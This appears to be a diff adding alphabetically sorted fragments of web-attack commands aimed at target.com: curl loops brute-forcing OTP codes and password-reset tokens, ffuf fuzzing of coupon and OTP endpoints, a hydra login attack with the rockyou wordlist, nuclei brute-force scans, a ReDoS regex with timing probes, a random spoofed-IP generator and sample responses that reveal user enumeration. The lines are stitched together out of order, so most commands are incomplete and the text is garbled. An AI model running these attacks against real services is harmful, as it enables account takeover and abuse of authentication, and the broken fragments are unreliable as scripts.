@@ -1,0 +1,32 @@
+"https://target.com/api/search?q=$INPUT")
+FAKE_IP="10.$(( RANDOM % 256 )).$(( RANDOM % 256 )).$(( RANDOM % 256 ))"
+GET /api/search?q=
+INPUT=$(python3 -c "print('a'*$LEN + '!')")
+POST /api/checkout/apply-coupon
+POST /api/register
+POST /api/v2/auth/verify-otp
+RESP=$(curl -s "https://target.com/reset?token=$TOKEN&email=test@own-account.com" \
+RESP=$(curl -s -X POST https://target.com/api/v2/auth/verify-otp \
+TIME=$(curl -s -o /dev/null -w "%{time_total}" \
+[ "$RESP" = "200" ] && echo "VALID TOKEN: $TOKEN"
+[ "$RESP" = "200" ] && echo "VALID: $CODE"
+[ "$RESP" = "429" ] && { echo "Rate limited at $CODE"; break; }
+[ "$RESP" = "429" ] && { echo "Rate limited at $TOKEN"; break; }
+^([a-zA-Z0-9]+)+$
+curl -s -X POST https://target.com/api/login \
+echo "Length $LEN: ${TIME}s"
+ffuf -u https://target.com/api/checkout/apply-coupon \
+ffuf -u https://target.com/api/verify-otp \
+for CODE in $(seq -f "%06g" 0 100); do
+for LEN in 10 20 30 40 50; do
+for TOKEN in $(seq -f "%04g" 0 9999); do
+for i in $(seq 1 1000); do
+http-post-form "/api/login:email=^USER^&password=^PASS^:invalid"
+hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt target.com \
+nuclei -u https://target.com -t brute-force/ -severity medium,high,critical
+{"error": "Invalid password"}
+{"error": "This email is already registered"}
+{"error": "User not found"}
+{"message": "No account found with this email"}
+{"message": "Password reset email sent"}
+{"success": true}
